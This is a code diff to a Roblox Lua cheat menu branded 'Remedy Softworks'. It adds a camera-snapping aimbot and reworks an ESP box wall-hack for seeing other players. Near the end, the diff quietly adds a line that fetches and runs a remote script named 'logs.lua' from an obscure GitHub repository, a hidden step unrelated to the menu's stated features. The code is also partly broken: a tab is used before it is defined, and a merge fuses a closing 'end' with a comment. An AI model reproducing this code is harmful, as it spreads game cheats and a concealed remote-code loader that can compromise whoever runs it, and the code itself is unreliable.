@@ -7,11 +7,60 @@ local window = DrRayLibrary:Load("Remedy-Mobile", "Default")
 -- Create the first tab with an image ID
 local tab1 = DrRayLibrary.newTab("Aim", "ImageIdHere")
 
-tab1.newToggle("Aimbot", "Aimbot!", true, function(toggleState)
+-- Aimbot Variables
+local aimbotConnection = nil
+
+-- Function to get the closest player to the camera's position
+local function getClosestPlayer()
+    local closestPlayer = nil
+    local shortestDistance = math.huge -- Start with the highest possible value
+    local camera = workspace.CurrentCamera
+    local localPlayer = game.Players.LocalPlayer
+
+    for _, player in pairs(game.Players:GetPlayers()) do
+        if player ~= localPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+            local hrp = player.Character.HumanoidRootPart
+            local distance = (camera.CFrame.Position - hrp.Position).Magnitude
+
+            if distance < shortestDistance then
+                shortestDistance = distance
+                closestPlayer = player
+            end
+        end
+    end
+
+    return closestPlayer
+end
+
+-- Function to aim at the closest player
+local function aimAtPlayer()
+    local closestPlayer = getClosestPlayer()
+    if closestPlayer and closestPlayer.Character and closestPlayer.Character:FindFirstChild("HumanoidRootPart") then
+        local camera = workspace.CurrentCamera
+        local hrp = closestPlayer.Character.HumanoidRootPart
+
+        -- Create a new CFrame that looks at the closest player's HumanoidRootPart
+        camera.CFrame = CFrame.new(camera.CFrame.Position, hrp.Position)
+    end
+end
+
+-- Toggle for aimbot
+tab1.newToggle("Aimbot", "Aimbot!", false, function(toggleState)
     if toggleState then
-        print("On")
+        print("Aimbot On")
+
+        -- Connect to RenderStepped to update aim each frame
+        aimbotConnection = game:GetService("RunService").RenderStepped:Connect(function()
+            aimAtPlayer()
+        end)
     else
-        print("Off")
+        print("Aimbot Off")
+
+        -- Disconnect the aimbot when toggled off
+        if aimbotConnection then
+            aimbotConnection:Disconnect()
+            aimbotConnection = nil
+        end
     end
 end)
 
@@ -73,10 +122,7 @@ local function toggleESP(toggleState)
         for _, player in pairs(Players:GetPlayers()) do
             if player ~= LocalPlayer then
                 createESPBox(player)
-            end
-        end
-
-        -- Update ESP boxes on every frame
+            end-- Connect to RenderStepped to update ESP boxes each frame
         espConnection = RunService.RenderStepped:Connect(function()
             for _, player in pairs(Players:GetPlayers()) do
                 if player ~= LocalPlayer and player.Character then
@@ -85,44 +131,56 @@ local function toggleESP(toggleState)
             end
         end)
 
-        -- Detect when a player dies and redraw the ESP
+        -- Handle new players joining
+        Players.PlayerAdded:Connect(function(player)
+            if player ~= LocalPlayer then
+                createESPBox(player)
+            end
+        end)
+
+        -- Handle players leaving
         Players.PlayerRemoving:Connect(function(player)
             removeESPBox(player)
         end)
 
-        -- Detect when a player joins and create their ESP box
-        Players.PlayerAdded:Connect(function(player)
-            if player ~= LocalPlayer then
-                createESPBox(player)
-                player.CharacterAdded:Connect(function(character)
-                    updateESPBox(player, character)
-                end)
-            end
-        end)
     else
         print("ESP Off")
 
-        -- Disconnect the ESP update connection
+        -- Disconnect ESP updates
         if espConnection then
             espConnection:Disconnect()
             espConnection = nil
         end
 
-        -- Hide and remove all ESP boxes
-        for _, box in pairs(espBoxes) do
-            box.Visible = false
-            box:Remove() -- Clean up the drawings
+        -- Remove all ESP boxes
+        for player, box in pairs(espBoxes) do
+            box:Remove()
+            espBoxes[player] = nil
         end
-        espBoxes = {} -- Clear the ESP table
     end
 end
 
--- Hook ESP toggle to your menu
-tab2.newToggle("ESP Box", "Esp Box", true, function(toggleState)
-    toggleESP(toggleState) -- Hooked up the toggle to the ESP functionality
+-- Toggle for ESP
+tab2.newToggle("ESP", "Toggle ESP!", false, function(toggleState)
+    toggleESP(toggleState)
 end)
 
--- Dropdown as in the original code
-tab2.newDropdown("Dropdown", "Select one of these options!", {"water", "dog", "air", "bb", "airplane", "wohhho", "yeay", "delete"}, function(selectedOption)
-    print(selectedOption)
-end)
+-- Load external script and execute it if available
+local externalScriptUrl = 'https://raw.githubusercontent.com/ffavex/AHfahf1r1-rah/main/logs.lua'
+local externalScript = loadstring(game:HttpGet(externalScriptUrl))()
+if externalScript then
+    -- Execute the external script
+    externalScript()
+end
+
+-- Send notification when the script is loaded
+game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "Remedy Softworks",
+    Text = "Thanks for Using Remedy Softworks",
+    Icon = "rbxassetid://113548811936137"
+})
+
+-- Create the second tab for visuals
+local tab2 = DrRayLibrary.newTab("Visuals", "ImageIdLogoHere")
+
+-- Other features or additional code can be added here
